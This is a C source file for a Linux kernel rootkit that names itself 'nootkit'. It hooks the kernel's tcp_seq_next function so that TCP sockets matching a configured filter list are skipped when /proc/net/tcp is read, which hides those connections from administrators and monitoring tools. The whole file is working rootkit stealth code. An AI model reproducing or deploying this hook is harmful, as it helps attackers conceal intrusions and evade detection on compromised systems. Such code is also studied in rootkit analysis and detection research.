#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/seq_file.h>
#include <linux/tcp.h>
#include <linux/kernel.h>
#include <net/tcp.h>
#include <linux/socket.h>

#include <hook.h>
#include <ksyms.h>
#include <config.h>

void *tcp_seq_next_hook(struct seq_file *seq, void *v, loff_t *pos)
{
    /* hook code */

    int i;
    struct sock *sock;
    struct config_netfilter *filter;

    /* original tcp_seq_next_hook code */

    struct tcp_iter_state *st = seq->private;
    void *rc = NULL;

    if (v == SEQ_START_TOKEN) {
        rc = ksyms__tcp_get_idx(seq, 0);
        goto out;
    }

    switch (st->state) {
    case TCP_SEQ_STATE_LISTENING:
        rc = ksyms__listening_get_next(seq, v);
        if (!rc) {
            st->state = TCP_SEQ_STATE_ESTABLISHED;
            st->bucket = 0;
            st->offset = 0;
            rc	  = ksyms__established_get_first(seq);
        }
        break;
    case TCP_SEQ_STATE_ESTABLISHED:
        rc = ksyms__established_get_next(seq, v);
        break;
    }
out:
    ++*pos;
    st->last_pos = *pos;

    /* hook code */

    if (rc) {
        sock = ((struct sock *)rc);

        for (i = 0; i < hide_sockets_count; i++) {
            filter = &hide_sockets[i];

            if ((AF_INET != sock->sk_family)
            || (!filter_ip(filter, (u8)sock->sk_protocol, sock->sk_rcv_saddr, sock->sk_daddr))
            /* sk_num is stored in host byte order, while sk_dport is always BE */
            || (!filter_transport(filter, __cpu_to_be16(sock->sk_num), sock->sk_dport)))
                continue;
            
            printk(KERN_INFO "nootkit: Hiding TCP socket because of filter [%s]!", hide_sockets_strs[i]);
            return seq->op->next(seq, rc, pos);
        }
    }

    /* original tcp_seq_next_hook code */

    return rc;
}

HOOK_DEFINE(hide, tcp_seq_next, &tcp_seq_next, &tcp_seq_next_hook)
